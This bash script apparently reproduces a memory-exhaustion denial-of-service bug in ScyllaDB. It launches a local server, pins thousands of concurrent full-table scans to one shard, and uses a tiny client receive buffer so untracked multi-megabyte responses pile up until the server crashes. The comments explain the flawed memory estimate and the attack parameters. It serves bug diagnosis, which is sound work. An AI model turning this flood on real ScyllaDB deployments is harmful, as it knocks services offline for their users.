#!/bin/bash
set -e

SCYLLA=./build/release/scylla
WORKDIR=/tmp/scylla-workdir
SMP=4
MEMORY=1G

# Kill any running scylla instances
pkill -9 -f 'scylla.*--workdir' 2>/dev/null || true
sleep 2

# Clean up previous working directory
rm -rf "$WORKDIR"

# Root cause: transport/server.cc line ~765:
#   auto mem_estimate = f.length * 2 + 8000;
# The mem_estimate is based solely on the incoming request frame size.
#
# For "SELECT * FROM ks.cf0 ALLOW FILTERING", the request is ~50 bytes,
# so mem_estimate = ~8100 bytes.  But the response contains ALL rows in
# the table — potentially tens of MB.
#
# With 4 shards: each shard has ~256MB (1GB total, minus Seastar overhead).
# Transport semaphore per shard = ~25MB.
# result_memory_limiter per shard = ~25MB.
#
# Strategy: use shard-aware port 19042 to pin ALL client connections to
# shard 0.  All scan queries coordinate on shard 0, which gathers results
# from all 4 shards.  Data physically on shards 1-3 is memcpy'd into
# response bodies on shard 0 (in make_result()).  The response bodies
# pile up on shard 0, untracked by any semaphore.
#
# Additionally, set tiny SO_RCVBUF (1KB) on client sockets to create
# TCP backpressure.  The client's receive window shrinks, causing the
# server's write_message() to block.  Response bodies (multi-MB each)
# pile up in _ready_to_respond chains on shard 0.

echo "=== Starting Scylla server ($MEMORY RAM, $SMP smp) ==="
$SCYLLA \
    --workdir "$WORKDIR" \
    --smp $SMP \
    -m $MEMORY \
    --developer-mode 1 \
    --overprovisioned \
    > scylla-server2.log 2>&1 &
SCYLLA_PID=$!
echo "Scylla PID: $SCYLLA_PID"

# Wait for CQL port to be ready (check both 9042 and shard-aware 19042)
echo "Waiting for Scylla to start listening on port 19042..."
for i in $(seq 1 120); do
    if ! kill -0 $SCYLLA_PID 2>/dev/null; then
        echo "ERROR: Scylla exited before becoming ready!"
        tail -20 scylla-server2.log
        exit 1
    fi
    if ss -tlnp 2>/dev/null | grep -q ':19042 '; then
        echo "Scylla is ready (took ~${i}s)"
        break
    fi
    if [ $i -eq 120 ]; then
        echo "ERROR: Timeout waiting for Scylla to start"
        tail -20 scylla-server2.log
        kill $SCYLLA_PID 2>/dev/null || true
        exit 1
    fi
    sleep 1
done

# Pre-populate: 30 rows per table, each ~1MB (5 blob columns of 200KB each).
# With 4 shards, data distributes across shards: ~7-8 rows per shard.
# A full scan (SELECT * ALLOW FILTERING) from shard 0 gathers ALL 30 rows
# from all shards = ~30MB per response.
#
# Attack parameters:
#   - Connections to shard-aware port 19042, pinned to shard 0
#   - scan workload: SELECT * FROM ks.cf0 ALLOW FILTERING
#   - 100 connections * 50 concurrency = 5000 concurrent scan requests
#   - Each response is ~30MB, but mem_estimate allows only ~8KB per request
#   - Shard 0 has only 64MB of memory
#   - TCP backpressure (1KB rcvbuf) keeps response bodies in memory
echo "=== Starting result-size amplification flood (scan workload, shard-pinned) ==="
$SCYLLA perf-cql-raw \
    --smp 1 \
    --workload scan \
    --use-prepared 0 \
    --remote-host 127.0.0.1 \
    --port 19042 \
    --target-shard 0 \
    --nr-shards $SMP \
    --row-size 1000000 \
    --rcvbuf 1024 \
    --connections-per-shard 100 \
    --concurrency-per-shard 50 \
    --tables 1 \
    --partitions 30 \
    --duration 30 \
    --continue-after-error 1 \
    2>&1 | tee perf-result-size.log || true

echo ""
echo "=== Checking if Scylla survived ==="
if kill -0 $SCYLLA_PID 2>/dev/null; then
    echo "Scylla survived (no OOM triggered)."
else
    wait $SCYLLA_PID 2>/dev/null
    EXIT_CODE=$?
    echo "Scylla CRASHED (exit code: $EXIT_CODE) — likely OOM!"
fi

echo "--- Last 30 lines of server log ---"
tail -n 30 scylla-server2.log

echo "--- OOM-related errors ---"
grep -c 'std::bad_alloc' scylla-server2.log && echo "std::bad_alloc found!" || echo "No std::bad_alloc"
grep -c 'logalloc::bad_alloc' scylla-server2.log && echo "logalloc::bad_alloc found!" || echo "No logalloc::bad_alloc"

# Kill server immediately to avoid long graceful shutdown
kill -9 $SCYLLA_PID 2>/dev/null || true
wait $SCYLLA_PID 2>/dev/null || true
